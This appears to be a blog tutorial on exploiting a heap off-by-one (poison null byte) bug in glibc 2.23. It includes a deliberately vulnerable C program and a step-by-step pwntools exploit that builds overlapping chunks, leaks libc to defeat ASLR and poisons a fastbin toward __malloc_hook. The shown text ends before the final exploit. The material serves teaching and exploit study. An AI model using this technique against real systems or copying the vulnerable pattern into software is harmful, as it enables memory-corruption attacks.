@@ -1,0 +1,1292 @@
+![](https://devel0pment.de/wp-content/uploads/2018/08/poison_null.png)
+
+The goal of this article is to explain in detail how an off-by-one vulnerability on the heap also known as *poison null byte* can be exploited. Although this technique does not work with the latest libc, I think it can be used very good in order to demonstrate how exploits based on heap-metadata corruption work (also check out [shellphish’s how2heap](https://github.com/shellphish/how2heap)).
+
+In order to do this I created a vulnerable program, which we will use as an example to create such an exploit. If you like to, you can start by analyzing and exploiting the program on your own (at least check out [Environment](https://devel0pment.de/?p=688#env)):
+
+–\> [heap.zip](https://devel0pment.de/wp-content/uploads/2018/08/heap.zip)
+
+Though it is not required to the exploit the program, the source-code might be helpful:
+
+–\> [heap.c](https://devel0pment.de/wp-content/uploads/2018/08/heap.c)
+
+The article is divided into the following sections:
+
+–\> [Environment](https://devel0pment.de/?p=688#env)  
+–\> [Vulnerable Program](https://devel0pment.de/?p=688#vuln)  
+–\> [Heap Basics](https://devel0pment.de/?p=688#basic)  
+–\> [Libc-Leak](https://devel0pment.de/?p=688#libc)  
+–\> [Control Instruction Pointer](https://devel0pment.de/?p=688#rip)  
+–\> [One Gadget](https://devel0pment.de/?p=688#oneg)  
+–\> [Final Exploit](https://devel0pment.de/?p=688#final)
+
+------------------------------------------------------------------------
+
+## Environment
+
+There is a major difference between stack- and heap-based exploits: the stack-logic (e.g. what calling conventions are being used) is compiled into the binary. It does not matter which libc-version your system is using: each `push` and `pop` or reference to the stack (e.g. `ebp+0x20`) is part of the binary and is not affected by an external library.
+
+This is different with the heap. The heap-logic depends on the libc-version being used. A software developer uses a straight-forward interface (e.g. `malloc` and `free`) to access the heap. This interface does not change. The implementation of the interface does. This means that each libc-version may implement the heap-interface differently. For a software developer who uses the interface it is only important, that each call to `malloc` allocates the requested bytes on the heap and a subsequent call to `free` deallocates this memory. He does not care about how the libc manages the heap-memory. For an exploit developer this is important. A vulnerability like the off-by-one vulnerability explained in this article corrupts the heap’s metadata. These metadata are additional information stored on the heap for each allocated or free chunk in order to keep track of the available memory. An exploit corrupting these metadata may only work with a specific libc-version. This does not only affect the offsets being used in the exploit but rather the whole exploit-logic depending on how the libc allocates/deallocates chunks and what security checks are performed on the metadata.
+
+Long story short: In order to comprehend the steps described in this article I recommend you to use the same environment (especially libc-version).
+
+I used an `Ubuntu 16.04.4 LTS (Xenial Xerus)`:
+
+``` bash
+xerus@xerus:~$ cat /etc/lsb-release 
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
+```
+
+Kernel-version `4.13`:
+
+``` bash
+xerus@xerus:~$ uname -a
+Linux xerus 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+With libc-version `2.23`:
+
+``` bash
+xerus@xerus:~/pwn/heap$ ldd heap
+	linux-vdso.so.1 =>  (0x00007ffff7ffa000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a0d000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)
+
+xerus@xerus:~/pwn/heap$ ls -al /lib/x86_64-linux-gnu/libc.so.6
+lrwxrwxrwx 1 root root 12 Jul 23 07:11 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.23.so
+
+xerus@xerus:~/pwn/heap$ file /lib/x86_64-linux-gnu/libc-2.23.so 
+/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb, for GNU/Linux 2.6.32, stripped
+```
+
+*Address Space Layout Randomization* (*ASLR*) is enabled (disabled in exploit development phase):
+
+``` bash
+xerus@xerus:~/pwn/heap$ cat /proc/sys/kernel/randomize_va_space 
+2
+```
+
+The vulnerable program is compiled as a Position-independent Executable (`PIE`) with `Full RELRO`:
+
+``` bash
+xerus@xerus:~/pwn/heap$ checksec heap
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols	Yes	0		6	heap
+```
+
+------------------------------------------------------------------------
+
+## Vulnerable Program
+
+As described in the introduction we will have a look at a sample program, which is affected by an off-by-one vulnerability on the heap.
+
+The program is similar to an usual ctf heap-pwn challenge displaying a menu to choose between creating/deleting/printing a chunk:
+
+``` bash
+xerus@xerus:~/pwn/heap$ ./heap 
+1. create
+2. delete
+3. print
+4. exit
+> 
+```
+
+When creating a chunk the desired size and data has to be entered:
+
+``` bash
+> 1
+
+using slot 0
+size: 40
+data: AAAAAAAAAAAAAAAAAAAAAAAAA
+successfully created chunk
+```
+
+The output contains the slot in which the newly allocated chunk is stored (in this case `slot 0`).
+
+This slot index is supposed to be used when printing a chunk…
+
+``` bash
+> 3
+idx: 0
+
+data: AAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+or when deleting it:
+
+``` bash
+> 2
+idx: 0
+successfully deleted chunk
+```
+
+Let’s have a look at the source-code:
+
+``` cpp
+xerus@xerus:~/pwn/heap$ cat heap.c 
+/**
+ *
+ * heap.c
+ *
+ * sample program: heap off-by-one vulnerability
+ * 
+ * gcc heap.c -pie -fPIE -Wl,-z,relro,-z,now -o heap
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define DELETE 1
+#define PRINT 2
+
+void create();
+void process(unsigned int);
+
+char *ptrs[10];
+
+/**
+ * main-loop: print menu, read choice, call create/delete/exit
+ */
+int main() {
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  while(1) {
+    unsigned int choice;
+    puts("1. create\n2. delete\n3. print\n4. exit");
+    printf("> ");
+    scanf("%u", &choice);
+
+    switch(choice) {
+      case 1: create(); break;
+      case 2: process(DELETE); break;
+      case 3: process(PRINT); break;
+      case 4: exit(0); break;
+      default: puts("invalid choice"); break;
+    }
+  }
+}
+
+
+/**
+ * creates a new chunk.
+ */
+void create() {
+
+  unsigned int i, size;
+  unsigned int idx = 10;
+  char buf[1024];
+
+  for (i = 0; i < 10; i++) {
+    if (ptrs[i] == NULL) {
+      idx = i;
+      break;
+    }
+  }
+  if (idx == 10) {
+    puts("no free slots\n");
+    return;
+  }
+  
+  printf("\nusing slot %u\n", idx);
+
+  printf("size: ");
+  scanf("%u", &size);
+  if (size > 1023) {
+    puts("maximum size (1023 bytes) exceeded\n");
+    return;
+  }
+
+  printf("data: ");
+  size = read(0, buf, size);
+  buf[size] = 0x00;
+  
+  ptrs[idx] = (char*)malloc(size);
+  strcpy(ptrs[idx], buf);
+
+  puts("successfully created chunk\n");
+}
+
+
+/**
+ * deletes or prints an existing chunk.
+ */
+void process(unsigned int action) {
+
+  unsigned int idx;
+  printf("idx: ");
+  scanf("%u", &idx);
+
+  if (idx > 10) {
+    puts("invalid index\n");
+    return;
+  }
+
+  if (ptrs[idx] == NULL) {
+    puts("chunk not existing\n");
+    return;
+  }
+
+  if (action == DELETE) {
+    free(ptrs[idx]);
+    ptrs[idx] = NULL;
+    puts("successfully deleted chunk\n");
+  }
+  else if (action == PRINT) {
+    printf("\ndata: %s\n", ptrs[idx]);
+  }
+
+}
+```
+
+Can you spot the vulnerability?
+
+Spoiler ahead …
+
+|     |
+|-----|
+|     |
+
+The vulnerability resides within the function `create` in the following lines:
+
+``` cpp
+  printf("data: ");
+  size = read(0, buf, size);
+  buf[size] = 0x00;
+  
+  ptrs[idx] = (char*)malloc(size);
+  strcpy(ptrs[idx], buf);
+```
+
+After the call to `read` `size` contains the amounts of bytes read, which are limited to the size the user entered (maximum 1023).
+
+`size` is then used as an index in `buf` in order to null-terminate the entered user-data on *line 69* (`read` does not do this).
+
+Even if the user enters the maximum size (1023), there is no stack-overflow since `buf` contains 1024 bytes.
+
+The actual problem arises on *lines 71-72* when a chunk with `size` bytes is created by the call to `malloc` and the function `strcpy` is used to copy the data from `buf` to this newly created chunk (`ptrs[idx]`). Since `strcpy` also copies the terminating null-byte this may overflow the heap-chunk.
+
+------------------------------------------------------------------------
+
+## Heap Basics
+
+So we have identified a vulnerability which gives us the possibility to overflow a heap-chunk with a single null-byte. It does not sound like we could do alot with this, does it? Well, actually we can: supposing that the program is running on a server this tiny null-byte can lead to full *Remote Code Execution* (*RCE*). But before we jump right into the development of our exploit, we shortly recap some heap basics.
+
+Let’s allocate a heap-chunk using `malloc`:
+
+``` cpp
+...
+  char *ptr = malloc(0x88);
+...
+```
+
+After the call to `malloc` the address of the new chunk is stored in `RAX`:
+
+``` bash
+[----------------------------------registers-----------------------------------]
+RAX: 0x602010 --> 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7dd1b20 --> 0x100000000 
+RDX: 0x602010 --> 0x0 
+RSI: 0x602090 --> 0x0 
+RDI: 0x7ffff7dd1b20 --> 0x100000000 
+RBP: 0x7fffffffe490 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffe470 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
+RIP: 0x400578 (<main+18>:	mov    QWORD PTR [rbp-0x10],rax)
+R8 : 0x602000 --> 0x0 
+R9 : 0xd ('\r')
+R10: 0x7ffff7dd1b78 --> 0x602090 --> 0x0 
+R11: 0x0 
+R12: 0x400470 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffe570 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40056a <main+4>:	sub    rsp,0x20
+   0x40056e <main+8>:	mov    edi,0x88
+   0x400573 <main+13>:	call   0x400450 <malloc@plt>
+=> 0x400578 <main+18>:	mov    QWORD PTR [rbp-0x10],rax
+...
+```
+
+The heap-metadata for each chunk are two 8 byte values (4 byte on 32bit), which are stored in front of the actual data of the chunk. Notice that malloc returns the address of the data (`0x602010`). This means the whole chunk begins at `0x602000`):
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/heapbasic-1.png)
+
+The `prev_size` field contains the size of the previous chunk, if it is free. If the previous chunk is allocated, this field is not necessary and is also used for data of the previous chunk. The `size+flags` field contains the size of the chunk itself (metadata+data). Because the chunk-size is always aligned to 8 byte (`0x8`), the three least significant bits of the `size+flags` field would always be zero and are thus used to store the following flags: `allocated arena` (`0x4`), `mmap` (`0x2`) and `previous chunk in use` (`0x1`). For our purpose only the `previous chunk in use` flag is relevant. This flag determines if the previous chunk is free (flag = 0) or allocated (flag = 1).
+
+Let’s create another chunk:
+
+``` cpp
+...
+  char *ptr = malloc(0x88);
+  char *ptr2 = malloc(0x28);
+...
+```
+
+After the second call to `malloc` the heap looks like this:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/heapbasic-2.png)
+
+When filling all 0x88 bytes of the first chunk, ..
+
+``` cpp
+...
+  char *ptr = malloc(0x88);
+  char *ptr2 = malloc(0x28);
+  for (int i = 0; i < 0x88; i++) ptr[i] = 'A';
+...
+```
+
+.. we can see that the `prev_size` field of the second chunk is used for data of the first chunk:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/heapbasic-3.png)
+
+Let’s now delete the first chunk ..
+
+``` cpp
+...
+  char *ptr = malloc(0x88);
+  char *ptr2 = malloc(0x28);
+  for (int i = 0; i < 0x88; i++) ptr[i] = 'A';
+  free(ptr);
+...
+```
+
+.. and have a look at the heap:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/heapbasic-4.png)
+
+Notice that the `prev_size` field of chunk2 is actually set and the `previous chunk in use` flag has been unset. The first 16 bytes of data of the free chunk now contain the `Forward Pointer` (`FD`) and the `Backward Pointer` (`BK`). These pointers are used to store all free chunks in doubly linked lists called *bins*. The exception are small chunks, which are stored in singly linked lists called *fastbins* (we will see the details later). As you may noticed, the values stored in the `FD` and `BK` are libc-addresses. This is because there is only a single free chunk for now and thus the `FD` and `BK` is set to the list’s `head` and `tail`, which are stored in the so called *main_arena* within the libc. We can inspect the main arena in `gdb` using the command `p main_arena`:
+
+``` bash
+gdb-peda$ p main_arena 
+$1 = {
+  mutex = 0x0, 
+  flags = 0x1, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x6020c0, 
+  last_remainder = 0x0, 
+  bins = {0x602000, 0x602000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
+    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 
+    0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 
+    0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bc8 <main_arena+168>, 0x7ffff7dd1bd8 <main_arena+184>, 
+...
+```
+
+The first thing to notice is that the main arena also contains a value called `top`, which points to the top of the heap also known as *wilderness*.
+
+Our free chunk can be found within `bins`. `bins` contain a `head` and a `tail` pointer for each stored bin. The first `head` and `tail` pointer both reference our free chunk at `0x602000`. Notice again that this is the address returned by `malloc - 0x10` because it references the metadata and not the actual data. This offset must also be considered for the `head` and `tail` pointer stored in the `FD` and `BK` of the free’d chunk. Both the `FD` and the `BK` contain the value `0x7ffff7dd1b78`, which means that the actual `head` pointer is located at `+0x10 = 0x7ffff7dd1b88` and the `tail` pointer at `+0x18 = 0x7ffff7dd1b90`:
+
+``` bash
+gdb-peda$ x/xg 0x7ffff7dd1b78+0x10
+0x7ffff7dd1b88 <main_arena+104>:        0x0000000000602000
+gdb-peda$ x/xg 0x7ffff7dd1b78+0x18
+0x7ffff7dd1b90 <main_arena+112>:        0x0000000000602000
+```
+
+For now our doubly linked listed contains only one chunk:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_01.png)
+
+If we would free another chunk of the same size (in this case our chunk is stored in a *smallbin* in contrary to a *largebin* for chunks \>= 512 byte, which are treated slightly different), the second free’d chunk would be inserted at the head of the doubly linked list:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_02a.png)
+
+Each subsequent free’d chunk will be become the new head chunk:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_03.png)
+
+When we allocate a chunk of the corresponding size, we will be served with the free chunk from the tail of the list:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_04.png)
+
+In other words: smallbins are treated as *first in, first out* (*FIFO*):
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_05.png)
+
+I have already mentioned that small chunks are stored in singly linked lists called *fastbins*. So let’s see what happens, if we free the second chunk which only contains 0x28 bytes:
+
+``` cpp
+...
+  char *ptr = malloc(0x88);
+  char *ptr2 = malloc(0x28);
+  for (int i = 0; i < 0x88; i++) ptr[i] = 'A';
+  free(ptr);
+  free(ptr2);
+...
+```
+
+Now the heap looks like this:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/heapbasic-5.png)
+
+Well, actually nothing changed. This is because the chunk is stored in a fastbin and thus only contains a `Forward Pointer` (`FD`). As there are no more free chunks of the same size, the `FD` is set to zero to indicate the end of the list. The head of the fastbin is yet again stored within the main arena:
+
+``` bash
+gdb-peda$ p main_arena 
+$1 = {
+  mutex = 0x0, 
+  flags = 0x0, 
+  fastbinsY = {0x0, 0x602090, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x6020c0, 
+  last_remainder = 0x0, 
+  bins = {0x602000, 0x602000, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
+    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 
+...
+```
+
+`fastbinY` contains a head pointer for each fastbin. As you can see there are 10 fastbins, which differ in the size of the chunks stored in it. Until now there is only a single chunk in the second fastbin:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_06.png)
+
+If we would free another chunk of the same size, this chunk would be inserted at the head of the singly linked list (just like with smallbins):
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_07.png)
+
+Another chunk free’d:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_08.png)
+
+In contrast to smallbins free chunks within a fastbin are removed from the head on an allocation:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_09.png)
+
+In other words: fastbins are treated as *last in, first out* (*LIFO*):
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_10.png)
+
+After this short recap of some heap basics we are now set to start developing our exploit.
+
+Because ASLR is enabled and we do not know any libc-address, let’s start by leaking one.
+
+------------------------------------------------------------------------
+
+## Libc-Leak
+
+In order to leak a libc-address through a heap-based vulnerability we can leverage the fact, that the `FD` and `BK` of a free chunk at the head or tail of a bin contains libc-addresses of the main arena. If the program would be affected by an *Use After Free* (*UAF*) vulnerability, we could just free a chunk and then print its data. Since the first 8 bytes of data are the `FD`, we would get a libc-address right away. As the sample program does not contain an UAF vulnerability and we can only overflow a chunk with a single null-byte, we have to get a little bit more creative.
+
+A common goal to achieve a *UAF* like state is to create **overlapping chunks**. If the heap-metadata gets corrupted in such a way that two chunks are overlapping in memory, we can free one chunk (which now contains libc-addresses) and then use the other chunk to print those addresses.
+
+Let’s begin by determining what we can overwrite with the single null-byte. In order to do so we review the example from above, in which we allocated two chunks:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-1.png)
+
+As we can see the lowest byte of the `size+flags` field of chunk2 will be overwritten, when we overflow chunk1 with a single null-byte. In this case the value `0x31`, which represents the size of chunk2 (`0x30`) as well as the enabled `previous chunk in use` flag (`0x1`), would be set to `0x00`. This will likely crash the program, because the heap-metadata are not valid anymore (a chunk cannot have a size of `0x00`). But let’s consider what is happening, if chunk2 has a size of `0x100`:
+
+``` cpp
+...
+  char *ptr = malloc(0x88);
+  char *ptr2 = malloc(0xf8);
+  for (int i = 0; i < 0x88; i++) ptr[i] = 'A';
+...
+```
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-2.png)
+
+When we are overflowing chunk1 now, the size of chunk2 (`0x100`) is not altered, since it is only stored within the second lowest byte. The only thing being altered is the `previous chunk in use` flag, which is set from `0x1` to `0x0`. This means that we can clear the flag without corrupting any other heap-metadata.
+
+What can we do by clearing the `previous chunk in use` flag? The purpose of the flag is make it possible to consolidate adjacent free chunks. If there is a free chunk on the heap and the chunk right after this free chunk is also free, those two free chunks can be combined to a big free chunk. This way heap-fragmentation can be avoided (if there wouldn’t be chunks in fastbin-size, which are not consolidated). When a chunk is free’d, the libc checks if the `previous chunk in use` flag is set. If it is not, the chunk, which is supposed to be free’d, is consolidated with the precending free chunk. By clearing the `previous chunk in use` flag we can trick the libc into consolidating a free chunk with an actually allocated chunk, which precedes the free chunk.
+
+If we would just take our example from above, clear the `previous chunk in use` flag of chunk2 and then try to free chunk2 in order to trick the libc into consolidating both chunks, the program would simply crash. Why that? Well, chunk1 will be treated as a free chunk. This means that the `previous size` field of chunk1 should contain a valid value and – even more harder to fake – the `FD` and `BK` pointers should be set appropriately. But don’t worry! With a little bit more work we can achieve our goal to create two overlapping chunks.
+
+At this point we start working on the actual vulnerable sample program. At first I created a few helper-functions to create, delete and prints chunks using a python-script:
+
+``` python
+#!/usr/bin/env python
+
+from pwn import *
+
+p = process('./heap')
+
+def create(size, data):
+  p.sendlineafter('>', str(1))
+  p.sendlineafter('size: ', str(size))
+  p.sendlineafter('data: ', data)
+
+def delete(idx):
+  p.sendlineafter('>', str(2))
+  p.sendlineafter('idx: ', str(idx))
+
+def printData(idx):
+  p.sendlineafter('>', str(3))
+  p.sendlineafter('idx: ', str(idx))
+  p.recvuntil('data: ')
+  ret = p.recvuntil('\n')
+  return ret[:-1]
+```
+
+In order to create the overlapping chunks, we allocate four chunks at first:
+
+``` python
+create(0xf8, 'A'*0xf8) # chunk_AAA, idx = 0
+create(0x68, 'B'*0x68) # chunk_BBB, idx = 1
+create(0xf8, 'C'*0xf8) # chunk_CCC, idx = 2
+create(0x10, 'D'*0x10) # chunk_DDD, idx = 3
+```
+
+**Side note:* For debugging purpose I consider it easier to disable ASLR and just keep in mind, that I actually don’t know any address. This way the heap addresses will stay constant, which makes printing a little bit more handy.*
+
+So let’s have a look at the heap after the allocation of the four chunks:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-3.png)
+
+Each chunk will serve a different purpose. Here is just a quick overview:
+
+- **`chunk_AAA`** will be free’d to become a valid free chunk.
+- **`chunk_BBB`** will be used to trigger the off-by-one vulnerability overflowing into `chunk_CCC`. We will also set the `previous size` field of `chunk_CCC` to the size of `chunk_AAA + chunk_BBB`. `chunk_BBB` will be one of the overlapping chunks.
+- **`chunk_CCC`**‘s `previous chunk in use` flag will be cleared by the overflow. We will then free the chunk so that it will be consolidated with `chunk_AAA`. This big free chunk will overlap with `chunk_BBB`.
+- **`chunk_DDD`** is a fastbin-size chunk with the sole purpose to prevent consolidation with the top of the heap.
+
+Let’s carry out the mentioned actions step by step. At first we free `chunk_AAA`:
+
+``` python
+# chunk_AAA will be a valid free chunk (containing libc-addresses in FD/BK)
+delete(0)
+```
+
+Then we trigger the off-by-one vulnerability by overflowing `chunk_BBB` in order to clear the `previous chunk in use` flag of `chunk_CCC`. Because the size of `chunk_BBB` is in fastbin range, it will not be consolidated but rather put as a free chunk in the corresponding fastbin. When we reallocate a chunk with the same size, it will be stored at the exact same location.
+
+``` python
+# leverage off-by-one vuln in chunk_BBB:
+# overwrite prev_inuse bit of following chunk (chunk_CCC)
+delete(1)
+create(0x68, 'B'*0x68) # chunk_BBB, new idx = 0
+```
+
+After the `previous chunk in use` flag of `chunk_CCC` has been cleared, we also have to set the `previous size` field of `chunk_CCC` to the size of `chunk_AAA + chunk_BBB`, which is `0x170`. Unfortunately we cannot insert null-bytes in the data because `strcpy` is used, which will terminate on a null-byte. To insert null-bytes anyway, we simply reduce the data-length byte-by-byte. The appended null-byte at the end of the string will serve our purpose:
+
+``` python
+# set prev_size of following chunk (chunk_CCC) to 0x170
+for i in range(0x66, 0x5f, -1):
+  delete(0)
+  create(i+2, 'B'*i + '\x70\x01') # chunk_BBB, new_idx = 0
+```
+
+Let’s have a look at the heap after these steps:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-4.png)
+
+When we now free `chunk_CCC` it gets consolidated with the previous chunk, which is assumed to be 0x170 bytes large, because we faked the `previous size` field of `chunk_CCC`.
+
+``` python
+# now delete chunk_CCC to trigger consolidation with the fakechunk (0x170)
+# after this we have got a big free chunk (0x270) overlapping with chunk_BBB
+delete(2)
+```
+
+The result is a big free chunk overlapping with `chunk_BBB`:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-5.png)
+
+Now we only need to allocate a chunk with the same size of the original `chunk_AAA` (`0x100`) in order to align the big free chunk with `chunk_BBB` and thus store the `FD` and `BK` at the beginning of `chunk_BBB`:
+
+``` python
+# create a new chunk (chunk_EEE) within the big free chunk to push
+# the libc-addresses (fd/bk) down to chunk_BBB
+create(0xf6, 'E'*0xf6) # chunk_EEE, new_idx = 1
+```
+
+Notice that I chose `0xf6` instead of `0xf8` for the size to prevent triggering the off-by-one vulnerability again.
+
+The `FD` and `BK` of the big free chunk are now aligned with `chunk_BBB`:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-6.png)
+
+So we merely need to print `chunk_BBB` (`index 0`):
+
+``` python
+# the content of chunk_BBB now contains fd/bk (libc-addresses)
+# just print the chunk (idx = 0)
+libc_offset    = 0x3c4b78
+libc_leak = printData(0)
+libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64)
+libc_base = libc_leak - libc_offset
+log.info('libc_base: ' + hex(libc_base))
+```
+
+The offset `libc_offset` can be easily calculated using `gdb`. The script now yields the libc base-address and we have thus defeated ASLR:
+
+``` bash
+xerus@xerus:~/pwn/heap$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space 
+2
+xerus@xerus:~/pwn/heap$ ./exploit.py 
+[+] Starting local process './heap': pid 5053
+[*] libc_base: 0x7f8482a13000
+[*] Stopped process './heap' (pid 5053)
+xerus@xerus:~/pwn/heap$ ./exploit.py 
+[+] Starting local process './heap': pid 5057
+[*] libc_base: 0x7f28f53ef000
+[*] Stopped process './heap' (pid 5057)
+xerus@xerus:~/pwn/heap$ ./exploit.py 
+[+] Starting local process './heap': pid 5061
+[*] libc_base: 0x7f784c1c6000
+[*] Stopped process './heap' (pid 5061)
+```
+
+After successfully leaking the libc base-address we can calculate all addresses of interest. But the most important step is still missing: controlling the instruction pointer.
+
+------------------------------------------------------------------------
+
+## Control Instruction Pointer
+
+When considering how to the control the instruction pointer, there is yet again a great difference between stack- and heap-based exploits. The classical method on the stack is to overwrite the return address being stored there. On the heap there is no return address. It might be the case that function pointers of more complex objects (`struct` / `class`) are stored on the heap, which can be overwritten to directly control the instruction pointer, but this is not the case with our sample program. Instead we will stick to a common technique when exploiting heap-based vulnerabilites, which basically works like this:
+
+- Use the vulnerability to insert an address of our choice as a free chunk into a bin/fastbin.
+- Allocate a chunk which fits the size of this bin/fastbin. The allocation will return the inserted address (+ 0x10).
+- Write data of our choice into the allocated chunk. This will end up at the inserted address (+ 0x10).
+
+This way we can write arbitrary data to an address of our choice. Nevertheless there are some constraints as we will see later. For now it is only important that we are going to use a fastbin. Ultimately we simply want to overwrite some function pointer and do not need to write a hug amount of data, so the size of a fastbin will suffice. Also fastbins only use the forward pointer `FD`, which makes it easier as we will see.
+
+Let’s begin by determining how we can insert an address to a fastbin. As we have already seen, a fastbin is a singly linked list, whose head pointer is stored in the main arena. This head pointer references the first free chunk. The address of the second free chunk is stored in the `FD` of the first free chunk and so forth. If we manage to overwrite the `FD` of a free chunk, we effectively add a free `fakechunk` to the fastbin:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_11.png)
+
+On the next allocation the free chunk at the head of the fastbin is returned:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_12.png)
+
+The fakechunk is now the new head of the fastbin and is thus returned on the following allocation:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_13.png)
+
+Since we already have two overlapping chunks, we can use this to overwrite the `FD` of a free fastbin-chunk. At first we need to clean up a little bit from the libc-leak:
+
+``` python
+# restore the size field (0x70) of chunk_BBB
+for i in range(0xfd, 0xf7, -1):
+  delete(1)
+  create(i+1, 'E'*i + '\x70') # chunk_EEE, new_idx = 1
+
+# free chunk_BBB: the address of the chunk is added to the fastbin-list
+delete(0)
+
+# free chunk_EEE
+delete(1)
+```
+
+We restored the `size+flags` field of `chunk_BBB` and deleted both `chunk_BBB` and `chunk_EEE`. Now the heap looks like this (for debugging I turned ASLR off again):
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-7.png)
+
+The main arena now contains the address of the free’d `chunk_BBB` (`0x604110`):
+
+``` bash
+gdb-peda$ p main_arena 
+$1 = {
+  mutex = 0x0, 
+  flags = 0x0, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x604110, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x6042a0, 
+  last_remainder = 0x604120, 
+  bins = {0x604010, 0x604010, 0x7ffff7dd1b88 <main_arena+104>, 0x7ffff7dd1b88 <main_arena+104>, 
+    0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1b98 <main_arena+120>, 0x7ffff7dd1ba8 <main_arena+136>, 
+    0x7ffff7dd1ba8 <main_arena+136>, 0x7ffff7dd1bb8 <main_arena+152>, 0x7ffff7dd1bb8 <main_arena+152>, 
+...
+```
+
+This means our fastbin currenty looks like this:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_14.png)
+
+We can now simply allocate a chunk in the big free chunk to overwrite the `FD` of the free’d `chunk_BBB`:
+
+``` python
+# create another new chunk (chunk_FFF) within the big free chunk which
+# will set the fd of the free'd fastbin chunk_BBB to the value of foo
+foo = 0xdeadbeef
+create(0x108, 'F'*0x100 + p64(foo)) # new_idx = 0
+```
+
+The `FD` is overwritten with the value of our choice:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-8.png)
+
+By adjusting the `FD` the fastbin now looks like this:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/mainarena_15.png)
+
+The libc is constantley being hardened against attacks in the form of additional security checks. This means in our case that `malloc` will check if the address `0xdeadbeef` actually contains a valid free chunk with the appropriate size before returning this address. Since `chunk_BBB` had a size of 0x70, this is also the size a free chunk within this fastbin must have. The four lower bits are not evaluated, which means that a value in the range from `0x70` to `0x7f` is considered valid. Accordingly the data at `0xdeadbeef` should look like this:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-9.png)
+
+Luckily the libc contains a spot which fits our needs: A quadword (8 byte), which contains the value `0x000000000000007f` and thus can be used as the `size+flags` field and a function pointer following a few bytes ahead after this quadword, which can be overwritten and triggered to control the instruction pointer.
+
+Namely this function pointer is the `__malloc_hook`. When `__malloc_hook` contains a value unequal to null, this value is supposed to be a function pointer. On every call to `malloc` the function being referenced by `__malloc_hook` is called. By default `__malloc_hook` is null:
+
+``` bash
+gdb-peda$ x/xg &__malloc_hook
+0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000
+```
+
+As stated above, we can find a quadword containing the value `0x000000000000007f` a few bytes before `__malloc_hook`:
+
+![](https://devel0pment.de/wp-content/uploads/2018/08/dev-10.png)
+
